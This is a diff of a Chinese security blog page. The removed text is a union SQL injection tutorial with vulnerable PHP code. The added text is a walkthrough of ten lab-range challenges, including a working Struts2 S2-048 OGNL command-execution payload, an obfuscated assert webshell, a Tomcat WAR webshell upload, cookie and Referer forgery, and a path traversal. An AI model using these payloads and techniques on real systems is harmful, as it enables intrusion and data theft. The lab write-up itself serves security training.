@@ -7,41 +7,58 @@
   
   
   
-  <title>union注入攻击 | 墨竹星海’s Bolg</title>
+  <title>360众测靶场复盘 | 墨竹星海’s Bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="union注入攻击的原理及操作">
-<meta name="keywords" content="SQL注入">
+  <meta name="description" content="主观题很简单 单选多选和判断 十多分钟就能做好，实战靶场140分钟需要掌握好时间，遇见没思路的可以暂时放一下，回头再做">
+<meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="union注入攻击">
-<meta property="og:url" content="http://yoursite.com/2018/09/26/union注入攻击/index.html">
+<meta property="og:title" content="360众测靶场复盘">
+<meta property="og:url" content="http://yoursite.com/2020/04/08/360众测靶场复盘/index.html">
 <meta property="og:site_name" content="墨竹星海’s Bolg">
-<meta property="og:description" content="union注入攻击的原理及操作">
+<meta property="og:description" content="主观题很简单 单选多选和判断 十多分钟就能做好，实战靶场140分钟需要掌握好时间，遇见没思路的可以暂时放一下，回头再做">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204601.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204609.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204655.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204706.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204719.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204732.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204742.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204751.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204809.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204901.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204914.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820204949.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205004.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205021.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205038.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205050.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205101.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205113.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205129.png">
-<meta property="og:image" content="https://www.mzxh.xyz/picture/20190820205137.png">
-<meta property="og:updated_time" content="2020-02-12T14:37:21.265Z">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407210332.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407210459.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407210636.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407212653.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407212728.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407212916.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407213045.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407213240.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407213521.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407213747.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407213827.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407214819.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407215201.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407220400.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407220340.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407220532.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407220749.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407221752.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407221841.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407222000.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407222452.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407222723.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407222846.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407223113.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407223137.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407224515.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407224628.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407224654.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407224841.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407225114.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407225636.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407230449.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200407230712.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200408004148.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200408004256.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200408004412.png">
+<meta property="og:image" content="http://picture.mzxh.xyz/20200408004533.png">
+<meta property="og:updated_time" content="2020-04-08T01:58:23.945Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="union注入攻击">
-<meta name="twitter:description" content="union注入攻击的原理及操作">
-<meta name="twitter:image" content="https://www.mzxh.xyz/picture/20190820204601.png">
+<meta name="twitter:title" content="360众测靶场复盘">
+<meta name="twitter:description" content="主观题很简单 单选多选和判断 十多分钟就能做好，实战靶场140分钟需要掌握好时间，遇见没思路的可以暂时放一下，回头再做">
+<meta name="twitter:image" content="http://picture.mzxh.xyz/20200407210332.png">
   
   
     <link rel="icon" href="/img/favicon.png">
@@ -223,11 +240,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-union注入攻击" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-360众测靶场复盘" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/26/union注入攻击/" class="article-date">
-      <time datetime="2018-09-25T16:00:00.000Z" itemprop="datePublished">2018-09-26</time>
+      <a href="/2020/04/08/360众测靶场复盘/" class="article-date">
+      <time datetime="2020-04-07T16:00:00.000Z" itemprop="datePublished">2020-04-08</time>
 </a>
 
     </div>
@@ -241,7 +258,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      union注入攻击
+      360众测靶场复盘
     </h1>
   
 
@@ -251,13 +268,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>
+    <a class="article-category-link" href="/categories/墨者靶场/">墨者靶场</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -267,25 +284,105 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>union注入攻击的原理及操作<br><a id="more"></a></p>
-<p>靶机网址 <a href="http://192.168.95.130/sqltest/4.1.6/union.php?id=1" target="_blank" rel="noopener">http://192.168.95.130/sqltest/4.1.6/union.php?id=1</a></p>
-<p>访问该网址，页面返回正常<br><img src="https://www.mzxh.xyz/picture/20190820204601.png" alt></p>
-<p>在url后添加一个单引号，再次访问 页面返回的结果与id=1的不同<br><img src="https://www.mzxh.xyz/picture/20190820204609.png" alt></p>
-<p>访问id=1 and 1=1，由于and1=1为真，所以页面返回与id=1相同的结果<br><img src="https://www.mzxh.xyz/picture/20190820204655.png" alt></p>
-<p>访问id=1 ane 1=2，由于and1=2为假，所以页面返回与id=1不同的结果<br><img src="https://www.mzxh.xyz/picture/20190820204706.png" alt></p>
-<p>可以得出该网站可能存在SQL注入漏洞的结论.</p>
-<p>接着使用 order by1-99 语句查询该数据表的字段数量。可以理解为order by =1 order by =2 order by =3  …… order by =99如访问id=1 order by 5，页面返回与id=1相同的内容<br><img src="https://www.mzxh.xyz/picture/20190820204719.png" alt></p>
-<p>访问id=1 order by 6，页面返回与id=1不同的内容<br><img src="https://www.mzxh.xyz/picture/20190820204732.png" alt></p>
-<p>代表该表单只有5个字段内容，可以上数据库里对比一下。<br><img src="https://www.mzxh.xyz/picture/20190820204742.png" alt></p>
-<p>在数据库查询参数ID对应的内容，然后将数据库的内容输出到页面。由于是将数据输出到页面上，所以可以使用union注入。起通过ordey by 查询的结果，得到字段数为5，所以Union注入的语句如下所示</p>
-<p>Union select 1,2,3,4,5</p>
-<p><img src="https://www.mzxh.xyz/picture/20190820204751.png" alt><br>可以看到页面执行成功，但是没有返回union select的结果，这是由于代码只返回第一条结果，所以union select获取的内容没有输出到页面。可以通过设置ID参数值，让服务器返回union select的结果，例如ID的值设置为-1 这样数据库中没有id=-1的数据，所以会返回union select的结果。<br><img src="https://www.mzxh.xyz/picture/20190820204809.png" alt><br>返回结果为2:3 意味着在union select 1,2,3,4,5中，2和3的位置可以输入MySQL语句。我们尝试在2的位置查询当前数据库名（使用database()函数）访问id=-1 union select 1,database(),3,4,5页面成功返回了当前数据库信息。<br><img src="https://www.mzxh.xyz/picture/20190820204901.png" alt><br>得知了数据库名后，输入以下命令来查询表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&apos;test&apos; limit 0,1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.mzxh.xyz/picture/20190820204914.png" alt><br>页面返回了数据库的第一个表名，如果需要查看第二个表名，则修改limit中的第一位数字，例如limit 1,1 就可以获取数据库的第二个表名<br><img src="https://www.mzxh.xyz/picture/20190820204949.png" alt><br><img src="https://www.mzxh.xyz/picture/20190820205004.png" alt><br>已知库名和表名，查询字段名，这里用users表名做示范。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&apos;test&apos; and table_name=&apos;users&apos; limit 0,1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.mzxh.xyz/picture/20190820205021.png" alt><br>通过修改limit中的第一位数据获取全部字段名<br><img src="https://www.mzxh.xyz/picture/20190820205038.png" alt><br><img src="https://www.mzxh.xyz/picture/20190820205050.png" alt><br><img src="https://www.mzxh.xyz/picture/20190820205101.png" alt><br><img src="https://www.mzxh.xyz/picture/20190820205113.png" alt><br>当获取了库名，表名和字段名时，就可以构造SQL语句查询数据库的数据，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from test.user limit 0,1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://www.mzxh.xyz/picture/20190820205129.png" alt><br>对比一下，可以看到和数据库里的值相同<br><img src="https://www.mzxh.xyz/picture/20190820205137.png" alt></p>
-<h2 id="Union注入代码分析"><a href="#Union注入代码分析" class="headerlink" title="Union注入代码分析"></a>Union注入代码分析</h2><p>在Union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数ID对应的内容，然后将第一条查询结果中的username和address输出到页面，由于是将数据输出到页面上，所以可以利用union语句查询其他数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);</span><br><span class="line">// 检测连接</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;连接失败: &quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$result = mysqli_query($con,&quot;select * from users where `id`=&quot;.$id);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">echo $row[&apos;username&apos;] . &quot; : &quot; . $row[&apos;address&apos;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>当访问id=-1 union select 1,2,3,4,5 时执行的SQL语句为；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where ‘id’ =-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
-<p>此时SQL语句可以分为select * from users where ‘id’ =-1和union select 1,2,3,4,5两条，利用第二条语句（Union查询）就可以获取数据库中的数据</p>
+        <p>主观题很简单 单选多选和判断 十多分钟就能做好，实战靶场140分钟需要掌握好时间，遇见没思路的可以暂时放一下，回头再做<br><a id="more"></a><br>第一题：HTML前端代码分析</p>
+<p>访问后发现没有交互点 目录扫描也什么都没有。。。<br><img src="http://picture.mzxh.xyz/20200407210332.png" alt><br>尝试查看源代码<br><img src="http://picture.mzxh.xyz/20200407210459.png" alt><br>发现有一个php文件，但是访问不到这个IP地址，于是尝试直接访问靶机IP+文件名<br><img src="http://picture.mzxh.xyz/20200407210636.png" alt><br>获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/ZlNHTFFtWHV1cTNXb083eG9SS0hUZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/ZlNHTFFtWHV1cTNXb083eG9SS0hUZz09bW96aGUmozhe</a></p>
+<p>第二题：画网络</p>
+<p><img src="http://picture.mzxh.xyz/20200407212653.png" alt></p>
+<p>根据第一题的习惯，直接查看下源代码</p>
+<p><img src="http://picture.mzxh.xyz/20200407212728.png" alt></p>
+<p>发现漏洞编号CVE-2016-3081对应st2-032,直接上漏洞工具</p>
+<p><img src="http://picture.mzxh.xyz/20200407212916.png" alt><br><img src="http://picture.mzxh.xyz/20200407213045.png" alt></p>
+<p>获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/NWZ1OHFUbDgxV3JNdDhMa0RHQ3BnZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/NWZ1OHFUbDgxV3JNdDhMa0RHQ3BnZz09bW96aGUmozhe</a></p>
+<p>第三题：st2-004</p>
+<p><img src="http://picture.mzxh.xyz/20200407213240.png" alt><br>直接提示漏洞是st2-004</p>
+<p>s2-004 是一个目录遍历漏洞</p>
+<p>我们对../ 进行二次编码为..%252f 然后构建url去访问</p>
+<p><img src="http://picture.mzxh.xyz/20200407213521.png" alt></p>
+<p>获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/WXlXKzdpMHpjZ0JCY1NXdzRUMkhwUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/WXlXKzdpMHpjZ0JCY1NXdzRUMkhwUT09bW96aGUmozhe</a></p>
+<p>第四题：webshell分析</p>
+<p><img src="http://picture.mzxh.xyz/20200407213747.png" alt></p>
+<p>给了shell地址，下载回来看看</p>
+<p><img src="http://picture.mzxh.xyz/20200407213827.png" alt></p>
+<p>分析一下代码，若get到的1不为空且1=GET.fPZ87的话执行创建t.php并写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_ = str_replace(&apos;ilo&apos;, &apos;ass&apos;, str_replace(&apos;vey&apos;, &apos;ert&apos;, $_GET[2]));@$_($_POST[1]);</span><br></pre></td></tr></table></figure>
+<p>将$GET_[2]接收到的值中的vey替换为ert，ilo替换为ass，也是时候当2=ilovey是，构成assert($_POST[1])，密码为1的一句话，生成的t.php文件是一个webshell</p>
+<p>所以先访问http://<strong><em>.</em></strong>.<strong><em>.</em></strong>:49268/include/mysql_conn.php?1=GET.fPZ87  写入一句话t.php</p>
+<p>然后访问http://<strong><em>.</em></strong>.<strong><em>.</em></strong>:49268/include/t.php?2=ilovey</p>
+<p>直接菜刀连接 找到key</p>
+<p><img src="http://picture.mzxh.xyz/20200407214819.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/L3dtcFZpT0lXbVMrRW1GQzUxSTJlZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/L3dtcFZpT0lXbVMrRW1GQzUxSTJlZz09bW96aGUmozhe</a></p>
+<p>第五题：Tomcat弱口令</p>
+<p>看到tomcat后猜测是否存在弱口令，尝试admin/123456后成功登入</p>
+<p><img src="http://picture.mzxh.xyz/20200407215201.png" alt></p>
+<p>尝试上传war大马，（war大马就找一个jsp的大马，然后压缩为zip，再把后缀改为war就可以。这里卡了我好久。。。都是压缩为rar然后改的后缀，死活执行不起来）</p>
+<p>选择List Applications</p>
+<p><img src="http://picture.mzxh.xyz/20200407220400.png" alt></p>
+<p>上传后会自动解压出文件夹</p>
+<p><img src="http://picture.mzxh.xyz/20200407220340.png" alt></p>
+<p>直接访问大马 在服务器根目录获取到key</p>
+<p><img src="http://picture.mzxh.xyz/20200407220532.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/N3U3NER2eHVmQjgvQndWWTNPS1NZUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/N3U3NER2eHVmQjgvQndWWTNPS1NZUT09bW96aGUmozhe</a></p>
+<p>第六题：cms漏洞</p>
+<p>访问后发现是一个cms</p>
+<p><img src="http://picture.mzxh.xyz/20200407220749.png" alt></p>
+<p>百度搜了一下 这个版本有一个cookie欺骗</p>
+<p><img src="http://picture.mzxh.xyz/20200407221752.png" alt></p>
+<p>直接用cookie添加一个admin_name参数 值随意</p>
+<p><img src="http://picture.mzxh.xyz/20200407221841.png" alt></p>
+<p>然后访问admin/cms_admin.php页面</p>
+<p>在页面最底部找到key值</p>
+<p><img src="http://picture.mzxh.xyz/20200407222000.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/VkFCM3lXb0t5dFBNNkVLQVlvbFltQT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/VkFCM3lXb0t5dFBNNkVLQVlvbFltQT09bW96aGUmozhe</a></p>
+<p>第七题：伪造来源</p>
+<p><img src="http://picture.mzxh.xyz/20200407222452.png" alt></p>
+<p>提示只允许Google访问，判断是伪造来源</p>
+<p>直接抓包把Referer修改为<a href="http://google.com" target="_blank" rel="noopener">http://google.com</a></p>
+<p><img src="http://picture.mzxh.xyz/20200407222723.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/Y3pLcmdDUWhUQWwwMjRFTytzSVRkUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/Y3pLcmdDUWhUQWwwMjRFTytzSVRkUT09bW96aGUmozhe</a></p>
+<p>第八题：Wireshark分析</p>
+<p><img src="http://picture.mzxh.xyz/20200407222846.png" alt></p>
+<p>直接把包下载回来本地打开</p>
+<p>因为说是访问过一句话木马，所以直接搜.php文件</p>
+<p><img src="http://picture.mzxh.xyz/20200407223113.png" alt></p>
+<p>找到了一句话木马</p>
+<p>key就是一句话的木马，拿回靶场验证</p>
+<p><img src="http://picture.mzxh.xyz/20200407223137.png" alt></p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/VUlJNlhUbytOejlkL0pUVkt2UmVSUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/VUlJNlhUbytOejlkL0pUVkt2UmVSUT09bW96aGUmozhe</a></p>
+<p>第九题：文件上传</p>
+<p><img src="http://picture.mzxh.xyz/20200407224515.png" alt></p>
+<p>提示文件上传</p>
+<p>用御剑扫描一下目录</p>
+<p><img src="http://picture.mzxh.xyz/20200407224628.png" alt></p>
+<p>找到上传页面，尝试访问</p>
+<p><img src="http://picture.mzxh.xyz/20200407224654.png" alt></p>
+<p>是一个javascript弹窗，</p>
+<p><img src="http://picture.mzxh.xyz/20200407224841.png" alt></p>
+<p>抓包删除这段javascript</p>
+<p><img src="http://picture.mzxh.xyz/20200407225114.png" alt></p>
+<p>上传后发现没有回显路径，重新梳理后发现代码路径写在了/upload1.php页面上，把Cookie中的uploadmd5值修改为upload_file.php</p>
+<p><img src="http://picture.mzxh.xyz/20200407225636.png" alt></p>
+<p>可以看到上传后的路径为uploadfile 文件名修改为日期<em>verify值</em>文件名</p>
+<p><img src="http://picture.mzxh.xyz/20200407230449.png" alt></p>
+<p>构造一下</p>
+<p><strong><em>.</em></strong>.<strong><em>.</em></strong>:43745/admin/uploadfile/20200407_0b950d1f78593086_picture.php</p>
+<p><img src="http://picture.mzxh.xyz/20200407230712.png" alt></p>
+<p>菜刀连接，根目录获取到key</p>
+<p>原题地址：<a href="https://www.mozhe.cn/bug/detail/TzRsdjFSYW9HQlA2OFdGbXo0KzBUdz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/TzRsdjFSYW9HQlA2OFdGbXo0KzBUdz09bW96aGUmozhe</a></p>
+<p>第十题：struts2-048</p>
+<p>访问Integration/Struts 1 Integration：</p>
+<p><img src="http://picture.mzxh.xyz/20200408004148.png" alt></p>
+<p>在Gangster Name处构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://picture.mzxh.xyz/20200408004256.png" alt></p>
+<p>看到有回显 执行了ID命令 </p>
+<p>修改poc把id改成ls<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ls&apos;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>回显看到key.txt文件</p>
+<p><img src="http://picture.mzxh.xyz/20200408004412.png" alt></p>
+<p>继续修改poc 执行cat命令 </p>
+<p><img src="http://picture.mzxh.xyz/20200408004533.png" alt></p>
+<p>获取到key</p>
 
       
     </div>
@@ -294,10 +391,10 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/26/union注入攻击/">union注入攻击</a></p>
+        <p><span>本文标题:</span><a href="/2020/04/08/360众测靶场复盘/">360众测靶场复盘</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 墨竹星海 的个人博客">墨竹星海</a></p>
-        <p><span>发布时间:</span>2018年09月26日 - 00时00分</p>
-        <p><span>最后更新:</span>2020年02月12日 - 22时37分</p>
+        <p><span>发布时间:</span>2020年04月08日 - 00时00分</p>
+        <p><span>最后更新:</span>2020年04月08日 - 09时58分</p>
         <p>
         </p>
         <p>
@@ -309,18 +406,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/09/27/Boolean注入攻击/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Boolean注入攻击
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/09/25/新疆师范大学CTF隐写wp整理/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">新疆师范大学CTF隐写wp整理</div>
+    <a href="/2020/04/04/uWSGI 漏洞复现（CVE-2018-7490）/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">uWSGI 漏洞复现（CVE-2018-7490）</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -332,7 +420,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union注入代码分析"><span class="toc-number">1.</span> <span class="toc-text">Union注入代码分析</span></a></li></ol>
+    
 </div>
 <style>
     .left-col .switch-btn {
@@ -381,13 +469,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/27/Boolean注入攻击/" title="上一篇: Boolean注入攻击">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/09/25/新疆师范大学CTF隐写wp整理/" title="下一篇: 新疆师范大学CTF隐写wp整理">
+            <a href="/2020/04/04/uWSGI 漏洞复现（CVE-2018-7490）/" title="下一篇: uWSGI 漏洞复现（CVE-2018-7490）">
                 <i class="fa fa-angle-right"></i>
             </a>
         
